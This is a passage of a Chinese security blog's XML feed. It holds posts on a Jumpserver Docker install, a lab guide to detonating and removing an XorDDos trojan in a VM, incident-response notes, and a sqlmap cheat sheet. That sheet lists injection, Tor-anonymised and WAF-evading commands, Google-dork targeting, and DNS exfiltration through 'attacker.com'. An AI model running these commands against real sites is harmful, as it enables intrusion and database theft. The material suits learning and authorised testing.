确保高额交易有完整性控制的审计信息，以防止篡改或删除</p><p>• 建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。</p><p>• 建立或采取一个应急响应机制和恢复计划</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Jumpserver堡垒机</title>
    <link href="http://yoursite.com/2018/08/13/Jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/"/>
    <id>http://yoursite.com/2018/08/13/Jumpserver堡垒机/</id>
    <published>2018-08-13T08:48:02.000Z</published>
    <updated>2018-08-13T15:06:25.714Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p>我们采用的是docker的安装方式：</p><p>官方文档位置：<a href="https://jumpserver.readthedocs.io/zh/docs/dockerinstall.html" target="_blank" rel="noopener">https://jumpserver.readthedocs.io/zh/docs/dockerinstall.html</a></p><h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>centos7    Jumpserver    docker</p><h2 id="1-在centos安装docker，已经安装的可以跳过这一步"><a href="#1-在centos安装docker，已经安装的可以跳过这一步" class="headerlink" title="1.在centos安装docker，已经安装的可以跳过这一步"></a>1.在centos安装docker，已经安装的可以跳过这一步</h2><h4 id="系统要求"><a href="#系统要求" class="headerlink" title="系统要求"></a>系统要求</h4><p>64位，内核版本不低于3.10，推荐使用CentOS 7系统</p><p><code>uname -r</code>     #查看内核版本信息</p><h4 id="安装并启动Docker"><a href="#安装并启动Docker" class="headerlink" title="安装并启动Docker"></a>安装并启动Docker</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum   update  -y    #更新依赖</span><br><span class="line">yum   -y  install   docker</span><br><span class="line">systemctl   start   docker</span><br></pre></td></tr></table></figure><h4 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h4><p><code>docker version</code></p><p><img src="\images\pasted-49.png" alt="upload successful"></p><h4 id="配置Docker"><a href="#配置Docker" class="headerlink" title="配置Docker"></a>配置Docker</h4><p>设置镜像</p><p><code>vim /etc/docker/daemon.json</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://aj2rgad5.mirror.aliyuncs.com&quot;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>重启Docker<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker.service</span><br></pre></td></tr></table></figure></p><p>\2. 用Jumpserver的源</p><p>快速启动</p><p>使用 root 命令行输入:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -p 2222:2222 registry.jumpserver.org/public/jumpserver:1.0.0</span><br></pre></td></tr></table></figure></p><p><img src="\images\pasted-50.png" alt="upload successful"></p><p>这个过程有点漫长，可以挂个代理加速下载，centos7下挂代理的方法详情见下面链接：</p><p><a href="https://jingyan.baidu.com/article/148a1921f5c5fe4d71c3b105.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/148a1921f5c5fe4d71c3b105.html</a></p><p>下载好了以后我们看下docker仓库里的镜像有没有Jumpserver</p><p><code>docker  images</code></p><p><img src="\images\pasted-51.png" alt="upload successful"></p><p>我们在docker下启动jumpserver：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -p 2222:2222 -e DB_ENGINE=mysql -e DB_HOST=192.168.1.1 -e DB_PORT=3306 -e DB_USER=root -e DB_PASSWORD=xxx -e DB_NAME=jumpserver  registry.jumpserver.org/public/jumpserver:1.0.0</span><br></pre></td></tr></table></figure></p><p>在这里我们遇到了一个问题：</p><p><img src="\images\pasted-52.png" alt="upload successful"></p><p>这里提示我们端口被占用了</p><p>解决方法如下：</p><p>查看进程，发现相关的容器并没有在运行，而 docker-proxy 却依然绑定着端口</p><p>docker  ps</p><p>ps -aux | grep -v grep | grep docker-proxy</p><p>停止 doker 进程，删除所有容器，然后删除 local-kv.db 这个文件，再启动 docker 就可以了。</p><p>sudo service docker stop</p><p>docker rm $(docker ps -aq)</p><p>sudo rm /var/lib/docker/network/files/local-kv.db</p><p># sudo service docker start</p><p>成功启动起来</p><p>访问</p><p>浏览器访问: <a href="http:/" target="_blank" rel="noopener">http:/</a>/&lt;容器所在服务器IP&gt;:8080</p><p>SSH访问: ssh -p 2222 &lt;容器所在服务器IP&gt;</p><p>XShell等工具请添加connection连接</p><p>我们采用第一种方式访问看看</p><p><img src="\images\pasted-53.png" alt="upload successful"></p><p>默认</p><p>用户名：admin</p><p>密码：   admin</p><p><img src="\images\pasted-54.png" alt="upload successful"></p><p>如果要采用编译安装方式参考下面的文档：</p><p><a href="https://www.cnblogs.com/along21/p/8795907.html" target="_blank" rel="noopener">https://www.cnblogs.com/along21/p/8795907.html</a></p><p>设置详情见入门文档</p><p><a href="https://jumpserver.readthedocs.io/zh/docs/admin_create_asset.html" target="_blank" rel="noopener">https://jumpserver.readthedocs.io/zh/docs/admin_create_asset.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="用户审计" scheme="http://yoursite.com/categories/%E7%94%A8%E6%88%B7%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="用户审计" scheme="http://yoursite.com/tags/%E7%94%A8%E6%88%B7%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>XorDDos木马查杀指北</title>
    <link href="http://yoursite.com/2018/08/10/XorDDos%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/10/XorDDos木马查杀指北/</id>
    <published>2018-08-10T13:25:37.000Z</published>
    <updated>2018-08-13T15:06:43.854Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>PKHunter检查工具，PKHunter的安装教程见木马查杀RKhunter安装指北</p><p>VMware® Workstation 14 Pro</p><p>注意：安装病毒之前请把虚拟机设置成NAT或host-only模式防止病毒传播或造成破坏！ </p><h1 id="木马上传"><a href="#木马上传" class="headerlink" title="木马上传"></a>木马上传</h1><p>首先我们先把病毒样本上传至虚拟机并解压：</p><p>我们可以利用rz命令上传文件，没有安装的请执行yum -y install lrzsz</p><p>解压可以利用unzip命令，没有的请执行yum -y install unzip</p><p><code>yum -y install lrzsz unzip</code></p><p><code>rz</code></p><p><code>unzip XorDDos样本.zip</code></p><p>给木马文件赋予权限并执行文件： </p><p><code>chmod +x a753cb1ff86c742bb497155362664c3b</code>  </p><h1 id="查杀木马"><a href="#查杀木马" class="headerlink" title="查杀木马"></a>查杀木马</h1><p>利用lsof -i查看到可疑文件，PID为4294，协议使用的是UDP（PID可能不同机器不一样） </p><p>如果没有lsof命令，可用yum安装</p><p><code>yum -y install lsof.x86_64</code></p><p>尝试关闭进程：kill -9  4294后在利用lsof -i查看下 </p><p>发现又启动了个进程，PID为5383，怀疑这个木马病毒会自动改名启动 </p><p>查看我们上传木马的目录发现，木马程序自毁了，现在我们可以尝试下使用RKHunter看看有哪些文件疑似被木马篡改过，用RKHunter检测一下</p><p>排查步骤跳过（因为不是笔者发现的木马位置）</p><p>木马位置为/etc/cron.hourly/，木马文件名可能每个人都不一样，我们先用chmod 000木马的权限取消掉而不是先干掉进程，避免他改名并且可以提取样本进行进一步的分析。 </p><p><code>ll -a /etc/cron.hourly</code></p><p><code>chmod 000 ytimkiztjldbrs.sh</code></p><p>利用<code>ll -aR /etc/rc.d</code>查看木马文件的连接 </p><p>先<code>chmod 000 /etc/init.d/ytimkiztjldbrs</code> 把可疑的连接权限都取消掉</p><p>reboot重启后在利用<code>lsof -i</code>看看可疑进程有没有启动</p><p>用<code>netstat -lnapt</code>查看下有无可疑的udp端口开放 </p><h2 id="提取木马"><a href="#提取木马" class="headerlink" title="提取木马"></a>提取木马</h2><p>之后我们可以尝试吧机器联网，提取木马文件样本，首先我们关闭虚拟机然后把虚拟机设置成桥接（如果是NAT模式并且能上网的话忽略此步骤）关机命令：shutdown now</p><p>使用xshell连接机器，查看之前木马释放出来的脚本<code>cat /etc/cron.hourly/ytimkiztjldbrs.sh</code></p><p><code>#!/bin/sh</code><br><code>PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin</code><br><code>cp &quot;/usr/bin/ytimkiztjldbrs&quot; &quot;/usr/bin/wgxkzcllem&quot;</code></p><p><code>chmod 000 /usr/bin/wgxkzcllem</code>把可疑文件权限取消并尝试提取出来 </p><p>发现在/usr/bin下也有木马脚本，先去掉权限</p><p><code>chmod 000 ytimkiztjldbrs</code></p><p><code>chmod 000 ytimkiztjldbrs.sh</code></p><p>之后我们删除之前把权限都取消掉的文件</p><p>利用rm -rf命令</p><p>reboot重启系统</p><p>最后重装系统</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>应急响应</title>
    <link href="http://yoursite.com/2018/08/10/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>http://yoursite.com/2018/08/10/应急响应/</id>
    <published>2018-08-10T08:05:42.000Z</published>
    <updated>2018-08-13T15:07:02.025Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p>应急响应的目的:恢复系统的CIA</p><h3 id="应急响应6个阶段："><a href="#应急响应6个阶段：" class="headerlink" title="应急响应6个阶段："></a>应急响应6个阶段：</h3><p>pdcerf</p><p>准备、检测、遏制、根除、恢复、跟踪</p><h3 id="安全事件分类："><a href="#安全事件分类：" class="headerlink" title="安全事件分类："></a>安全事件分类：</h3><p>1.僵  木  蠕  等有害程序</p><p>2.网络攻击类 : DOS   DDOS  扫描</p><p>3.信息破坏类：网站内容篡改、假冒信息</p><p>4.信息内容安全：不良言论</p><p>5.设备的软硬件故障</p><p>6.自然灾害</p><p>7.其他</p><h3 id="事件分级（四级）"><a href="#事件分级（四级）" class="headerlink" title="事件分级（四级）:"></a>事件分级（四级）:</h3><p>原则：根据信息系统的危害程度，信息系统的重要性、以及对社会的影响等</p><p>1.特大</p><p>2.重大</p><p>3.严重</p><p>4.一般</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>SQLMAP一把梭</title>
    <link href="http://yoursite.com/2018/08/10/SQLMAP%E4%B8%80%E6%8A%8A%E6%A2%AD/"/>
    <id>http://yoursite.com/2018/08/10/SQLMAP一把梭/</id>
    <published>2018-08-10T03:30:05.000Z</published>
    <updated>2018-08-14T01:16:51.584Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-18.png" alt="upload successful"></p><h1 id="SQL注入的类型"><a href="#SQL注入的类型" class="headerlink" title="SQL注入的类型"></a>SQL注入的类型</h1><p>1.基于布尔的盲注，即可以根据返回页面判断条件真假的注入</p><p>2.基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（也就是根据页面返回时间是否增加）来判断</p><p>3.基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</p><p>4.联合查询注入，可以使用union的情况下的注入</p><p>5.堆查询注入，可以同时执行多条语句的执行时的注入</p><h1 id="SQLMAP对URL的操作"><a href="#SQLMAP对URL的操作" class="headerlink" title="SQLMAP对URL的操作"></a>SQLMAP对URL的操作</h1><p>1.判断可注入的参数</p><p>2.判断可以用哪种SQL注入技术来注入</p><p>3.识别出哪种数据库</p><p>4.根据用户选择，读取哪些数据</p><h1 id="SQLMAP支持的数据库"><a href="#SQLMAP支持的数据库" class="headerlink" title="SQLMAP支持的数据库"></a>SQLMAP支持的数据库</h1><p>MySQL，Oracle，PostgreSQL</p><p>Microsoft SQL Server，Microsoft Access，IBM DB2</p><p>SQLite，Firebird，Sybase，SAP MaxDB</p><h1 id="必备骚操作参数"><a href="#必备骚操作参数" class="headerlink" title="必备骚操作参数"></a>必备骚操作参数</h1><h2 id="一、观察注入数据"><a href="#一、观察注入数据" class="headerlink" title="一、观察注入数据"></a>一、观察注入数据</h2><p>sqlmap –v [args]此参数共有七个等级，默认等级为一级</p><p>0 只显示python错误以及严重信息</p><p>1 同时显示基本信息和警告信息（默认）</p><p>2 同时显示debug信息</p><p>3 同时显示注入的payload</p><p>4 同时显示HTTP请求</p><p>5 同时显示HTTP响应头</p><p>6 同时显示HTTP相应页面</p><h5 id="【如果想看到测试的payload就用等级3】"><a href="#【如果想看到测试的payload就用等级3】" class="headerlink" title="【如果想看到测试的payload就用等级3】"></a>【如果想看到测试的payload就用等级3】</h5><h2 id="二、获取目标方式"><a href="#二、获取目标方式" class="headerlink" title="二、获取目标方式"></a>二、获取目标方式</h2><h5 id="1-直接连接到数据库"><a href="#1-直接连接到数据库" class="headerlink" title="1.直接连接到数据库"></a>1.直接连接到数据库</h5><p>  参数：-d</p><p>  对单个数据库实例运行sqlmap</p><p><code>python sqlmap.py -d &quot;mysql://admin:admin@192.168.1.2:3306/testdb&quot; -f --banner --dbs --users</code> </p><h5 id="2-目标URL"><a href="#2-目标URL" class="headerlink" title="2.目标URL"></a>2.目标URL</h5><p>  参数：-u或者—url</p><p>  URL格式要求：http(s)://targeturl[:port]/[…]</p><p>  <code>python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs --users</code> </p><h5 id="3-从Burp或WebScarab代理中获取日志"><a href="#3-从Burp或WebScarab代理中获取日志" class="headerlink" title="3.从Burp或WebScarab代理中获取日志"></a>3.从Burp或WebScarab代理中获取日志</h5><p>  参数：-l</p><p>  把Burp proxy或者WebScarab proxy中的日志直接导出来交给sqlmap检测</p><h5 id="4-从文本中获取多个目标扫描"><a href="#4-从文本中获取多个目标扫描" class="headerlink" title="4.从文本中获取多个目标扫描"></a>4.从文本中获取多个目标扫描</h5><p>  参数：-m</p><p>  URL保存在文本中，sqlmap会一个一个检测</p><h5 id="5-从文件中加载HTTP请求"><a href="#5-从文件中加载HTTP请求" class="headerlink" title="5.从文件中加载HTTP请求"></a>5.从文件中加载HTTP请求</h5><p>  参数：-r</p><p>  【可以跳过设置一些其他参数比如cookie，POST数据】</p><p>  当请求是HTTPS的时候要配合—force-ssl参数来使用，或者你可以在Host头后面加上:443</p><h5 id="6-处理Google的搜索结果"><a href="#6-处理Google的搜索结果" class="headerlink" title="6.处理Google的搜索结果"></a>6.处理Google的搜索结果</h5><p>  参数：-g</p><p>  sqlmap可以测试注入Google的搜索结果中的GET参数</p><p>  <code>python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></p><h5 id="7-从一个配置加载选项INI文件"><a href="#7-从一个配置加载选项INI文件" class="headerlink" title="7.从一个配置加载选项INI文件"></a>7.从一个配置加载选项INI文件</h5><p>  参数：-c</p><p>  加载sqlmap.conf文件里面的相关配置</p><h2 id="三、请求方式"><a href="#三、请求方式" class="headerlink" title="三、请求方式"></a>三、请求方式</h2><h5 id="1-http数据"><a href="#1-http数据" class="headerlink" title="1.http数据"></a>1.http数据</h5><p>  参数：–data</p><p>  此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数</p><p>  <code>python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f --banner --dbs --users</code></p><h5 id="2-参数拆分字符"><a href="#2-参数拆分字符" class="headerlink" title="2.参数拆分字符"></a>2.参数拆分字符</h5><p>  参数：–param-del</p><p>  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数</p><p>  python sqlmap.py -u “<a href="http://www.target.com/vuln.php&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php&quot;</a> –data=”query=foobar;id=1” –param-del=”;” -f –banner –dbs –users</p><h5 id="3-HTTP-cookie头"><a href="#3-HTTP-cookie头" class="headerlink" title="3.HTTP cookie头"></a>3.HTTP cookie头</h5><p>  参数：–cookie/–load-cookies/–drop-set-cookie</p><p>  a.web应用需要登陆的时候</p><p>  b.你想要在这些头参数中测试SQL注入时</p><p>  如果你不想接受set-cookie可以使用—drop-set-cookie参数来拒接</p><h5 id="4-HTTP-User-Agent头"><a href="#4-HTTP-User-Agent头" class="headerlink" title="4.HTTP User-Agent头"></a>4.HTTP User-Agent头</h5><p>  参数：–user-agent/–random-agent</p><p>【可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user- agents.txt中获取】</p><p>  当–level参数设定为3或者3以上的时候，会尝试对User-agent进行注入</p><h5 id="5-HTTP-Host头"><a href="#5-HTTP-Host头" class="headerlink" title="5.HTTP Host头"></a>5.HTTP Host头</h5><p>  参数：–host</p><p>  可以手动设置HTTPHost头的值</p><h5 id="6-HTTP-Referer头"><a href="#6-HTTP-Referer头" class="headerlink" title="6.HTTP Referer头"></a>6.HTTP Referer头</h5><p>  参数：–referer</p><p>  可以在请求中伪造HTTP中的referer，当—level参数设定为3或者3以上时候会尝试对referer注入</p><h5 id="7-额外的HTTP头"><a href="#7-额外的HTTP头" class="headerlink" title="7.额外的HTTP头"></a>7.额外的HTTP头</h5><p>  参数：–headers</p><p>  可以通过以上参数来增加额外的http头</p><h5 id="8-HTTP认证保护"><a href="#8-HTTP认证保护" class="headerlink" title="8.HTTP认证保护"></a>8.HTTP认证保护</h5><p>  参数：–auth-type,–auth-cred</p><p>  登陆HTTP的认证保护支持三种方式：</p><p>  1.Basic</p><p>  2.Digest</p><p>  3.NTLM</p><p>  python sqlmap.py -u “<a href="http://www.target.com/vuln.php?id=1&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&quot;</a> –auth-type Basic –auth-cred “testuser:testpwd”</p><h5 id="9-HTTP协议的证书认证"><a href="#9-HTTP协议的证书认证" class="headerlink" title="9.HTTP协议的证书认证"></a>9.HTTP协议的证书认证</h5><p>  参数：–auth-type或–auth-cert</p><p>  当web服务器需要客户端证书进行身份认证时，需要提供两个文件：key_file，cert_file</p><p>  key_file是格式为PEM文件，包含着私钥，cert_file是格式为PEM的连接文件</p><h5 id="10-HTTP协议私有密钥身份认证"><a href="#10-HTTP协议私有密钥身份认证" class="headerlink" title="10.HTTP协议私有密钥身份认证"></a>10.HTTP协议私有密钥身份认证</h5><p>  参数：–auth-private</p><p>  当web服务器需要客户端私钥证书进行身份认证时，需要提供PEM格式包含私钥的key_file </p><h5 id="11-HTTP-S-代理"><a href="#11-HTTP-S-代理" class="headerlink" title="11.HTTP(S)代理"></a>11.HTTP(S)代理</h5><p>  参数：–proxy，–proxy-cred，–ignore-proxy</p><p>  使用–proxy代理格式：<a href="http://url:port" target="_blank" rel="noopener">http://url:port</a></p><p>  当http(s)需要认证是可以使用—proxy-cred参数：username：password</p><p>  –ignore-proxy是拒绝使用本地局域网的http(s)代理</p><h5 id="12-Tor网络匿名"><a href="#12-Tor网络匿名" class="headerlink" title="12.Tor网络匿名"></a>12.Tor网络匿名</h5><p>  参数：–tor，–tor-port，–tor-type和–check-tor</p><p>  配置好tor后，sqlmap使用–tor参数会自动尝试连接tor，使用tor网络进行数据提交。</p><h5 id="13-HTTP请求延迟"><a href="#13-HTTP请求延迟" class="headerlink" title="13.HTTP请求延迟"></a>13.HTTP请求延迟</h5><p>  参数：–delay</p><p>  可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p><h5 id="14-设定超时时间"><a href="#14-设定超时时间" class="headerlink" title="14.设定超时时间"></a>14.设定超时时间</h5><p>  参数：–timeout</p><p>  可以设定一个HTTP(S)请求超过多久判定为超时，10就代表10s，默认是30s</p><h5 id="15-设定重试超时"><a href="#15-设定重试超时" class="headerlink" title="15.设定重试超时"></a>15.设定重试超时</h5><p>  参数：–retries</p><p>  当HTTP(S)超时时，可以设定重试连接次数，默认3次</p><h5 id="16-设置随机改变的参数值"><a href="#16-设置随机改变的参数值" class="headerlink" title="16.设置随机改变的参数值"></a>16.设置随机改变的参数值</h5><p>  参数：–randomize</p><p>  可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</p><h5 id="17-利用正则过滤目标网址"><a href="#17-利用正则过滤目标网址" class="headerlink" title="17.利用正则过滤目标网址"></a>17.利用正则过滤目标网址</h5><p>  参数：–scope</p><p>  python sqlmap.py -l burp.log –scope=”(www)?.target.(com|net|org)”</p><h5 id="18-避免过多的错误请求被屏蔽"><a href="#18-避免过多的错误请求被屏蔽" class="headerlink" title="18.避免过多的错误请求被屏蔽"></a>18.避免过多的错误请求被屏蔽</h5><p>  参数：–safe-url，–safe-freq</p><p>  有的web应用程序会在你多次访问错误的请求后，触发防护策略，导致以后无法进行</p><p>  1.—safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下</p><p>  2.—safe-freq：提供一个安全不错误的连接，每次测试请求后都会再访问一次正常连接。</p><h5 id="19-使用SSL-HTTPS"><a href="#19-使用SSL-HTTPS" class="headerlink" title="19.使用SSL/HTTPS"></a>19.使用SSL/HTTPS</h5><p>  参数：–force-ssl</p><p>  如果用户想要强迫使用HTTPS或SSL则使用该参数</p><h5 id="20-关掉URL参数值编码"><a href="#20-关掉URL参数值编码" class="headerlink" title="20.关掉URL参数值编码"></a>20.关掉URL参数值编码</h5><p>  参数：–skip-urlencode</p><p>  根据参数位置，他的值默认会被URL编码，但是有时候目标web服务器不遵守RFC标准，只接受不经过URL编码的值，这个时候使用该参数。</p><h5 id="21-每次请求时候执行自定义的python代码"><a href="#21-每次请求时候执行自定义的python代码" class="headerlink" title="21.每次请求时候执行自定义的python代码"></a>21.每次请求时候执行自定义的python代码</h5><p>  参数：–eval</p><p>  在有些时候，需要根据某个参数值的变化，而修改另一个参数，才能形成正常的请求，这时可以用—eval参数在每次请求时根据所写python代码做完修改后的请求。<br>   python sqlmap.py -u “<a href="http://www.target.com/vuln.php?id=1&amp;hash=lsddjflka23&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&amp;hash=lsddjflka23&quot;</a> –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”</p><h2 id="四、优化"><a href="#四、优化" class="headerlink" title="四、优化"></a>四、优化</h2><h5 id="1-收集优化"><a href="#1-收集优化" class="headerlink" title="1.收集优化"></a>1.收集优化</h5><p>  参数：-o</p><p>  这个参数是一个别名，隐式的设置以下选项：</p><p>  –keep-alive</p><p>  –null-connection</p><p>  –threads=3</p><h5 id="2-输出预测"><a href="#2-输出预测" class="headerlink" title="2.输出预测"></a>2.输出预测</h5><p>  参数：–predict-output</p><p>  这是用于推理算法顺序检索的值的字符统计预测</p><h5 id="3-HTTP活动"><a href="#3-HTTP活动" class="headerlink" title="3.HTTP活动"></a>3.HTTP活动</h5><p>  参数：–keep-alive</p><p>  使用持久连接</p><h5 id="4-HTTP空连接"><a href="#4-HTTP空连接" class="headerlink" title="4.HTTP空连接"></a>4.HTTP空连接</h5><p>  参数：–null-connection</p><p>  可以用于盲注区分trus和false响应</p><h5 id="5-并发HTTP-S-请求"><a href="#5-并发HTTP-S-请求" class="headerlink" title="5.并发HTTP(S)请求"></a>5.并发HTTP(S)请求</h5><p>  参数：–threads</p><p>  可以指定并发HTTP(S)请求的最大数量，并发请求的最大数量设置10</p><h2 id="五、探测"><a href="#五、探测" class="headerlink" title="五、探测"></a>五、探测</h2><h5 id="1-测试参数"><a href="#1-测试参数" class="headerlink" title="1.测试参数"></a>1.测试参数</h5><p>  参数：-p，–skip</p><p>  当你使用—level的值很大但是有个别参数不想测试的时候可以使用—skip参数</p><p>  –skip=”user-agent.referer”</p><h5 id="2-URI注入点"><a href="#2-URI注入点" class="headerlink" title="2.URI注入点"></a>2.URI注入点</h5><p>  参数：-u</p><p>  python sqlmap.py -u “<a href="http://www.target.com/vuln/param1/vuln1*/param2&quot;" target="_blank" rel="noopener">http://www.target.com/vuln/param1/vuln1*/param2&quot;</a></p><h5 id="3-指定数据库"><a href="#3-指定数据库" class="headerlink" title="3.指定数据库"></a>3.指定数据库</h5><p>  参数：–dbms</p><p>  sqlmap会自动探测web的应用后端数据库是什么</p><h5 id="4-风险等级"><a href="#4-风险等级" class="headerlink" title="4.风险等级"></a>4.风险等级</h5><p>  参数：–risk</p><p>  共有四个风险等级，默认是1，会探测大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p><h5 id="5-页面比较"><a href="#5-页面比较" class="headerlink" title="5.页面比较"></a>5.页面比较</h5><p>  参数：–string，–not-string，–regexp，–code</p><p>  参数：–text-only，–titles</p><p>  在默认情况下区别true和false的布尔型注入，在这些参数中是比较原网页和探测注入后的不一样。</p><h2 id="六、注入技术"><a href="#六、注入技术" class="headerlink" title="六、注入技术"></a>六、注入技术</h2><h5 id="1-测试是否是注入"><a href="#1-测试是否是注入" class="headerlink" title="1.测试是否是注入"></a>1.测试是否是注入</h5><p>  参数：–technique</p><p>  B:Boolean- based blind SQL injection(布尔型注入)  E:Error-based SQL injection(报错型注入)</p><p>  U:UNION query SQL injection(联合查询注入)</p><p>  S:Stacked queries SQL injection(多语句查询注入)</p><p>  T:Time-based blind SQL injection(基于时间延迟注入)</p><h5 id="2-设定延时注入的时间"><a href="#2-设定延时注入的时间" class="headerlink" title="2.设定延时注入的时间"></a>2.设定延时注入的时间</h5><p>  参数：–time-sec</p><p>  当使用基于时间的盲注时，使用这个参数设定延时时间，默认是五秒</p><h5 id="3-设定UNION查询字段数"><a href="#3-设定UNION查询字段数" class="headerlink" title="3.设定UNION查询字段数"></a>3.设定UNION查询字段数</h5><p>  参数：–union-cols</p><p>  默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。设定–union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</p><h5 id="4-设定UNION查询使用的字符"><a href="#4-设定UNION查询使用的字符" class="headerlink" title="4.设定UNION查询使用的字符"></a>4.设定UNION查询使用的字符</h5><p>   参数：–union-char</p><p>  默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用–union-char只定UNION查询的字符。</p><h5 id="5-DNS泄露攻击"><a href="#5-DNS泄露攻击" class="headerlink" title="5.DNS泄露攻击"></a>5.DNS泄露攻击</h5><p>   参数：–dns-domain</p><p>  假设攻击者控制着某域名（例如：attacker.com）的域名解析服务器，即查询该域名的子域名对应的IP地址都会到这台域名解析服务器来查询。 </p><p>  这时攻击者就可以使用“–dns-domain attacker.com”来进行DNS泄露攻击。</p><h5 id="6-二阶SQL注入"><a href="#6-二阶SQL注入" class="headerlink" title="6.二阶SQL注入"></a>6.二阶SQL注入</h5><p>   参数：–second-order</p><p>  有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。–second-order后门跟一个判断页面的URL地址。</p><h2 id="七、指纹"><a href="#七、指纹" class="headerlink" title="七、指纹"></a>七、指纹</h2><h5 id="数据库管理系统指纹"><a href="#数据库管理系统指纹" class="headerlink" title="数据库管理系统指纹"></a>数据库管理系统指纹</h5><p>参数：-f或–fingerprint    </p><p>这个参数是对后端的数据库进行识别    其实默认地sqlmap会自动对注入目标进行数据库管理系统指纹识别。 </p><h2 id="八、列数据"><a href="#八、列数据" class="headerlink" title="八、列数据"></a>八、列数据</h2><h5 id="1-标志"><a href="#1-标志" class="headerlink" title="1.标志"></a>1.标志</h5><p>参数：-b,–banner    </p><p>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。 </p><h5 id="2-用户"><a href="#2-用户" class="headerlink" title="2.用户"></a>2.用户</h5><p>参数：–current-user    sqlmap在大多数据库中可以获取到管理数据的用户 </p><h5 id="3-当前数据库"><a href="#3-当前数据库" class="headerlink" title="3.当前数据库"></a>3.当前数据库</h5><p>参数：–current-db    返还当前连接的数据库 </p><h5 id="4-当前用户是否为管理员"><a href="#4-当前用户是否为管理员" class="headerlink" title="4.当前用户是否为管理员"></a>4.当前用户是否为管理员</h5><p>参数：–is-dba    判断当前的用户是否为管理，是的话会返回True </p><h5 id="5-列数据库管理用户"><a href="#5-列数据库管理用户" class="headerlink" title="5.列数据库管理用户"></a>5.列数据库管理用户</h5><p> 参数：–users    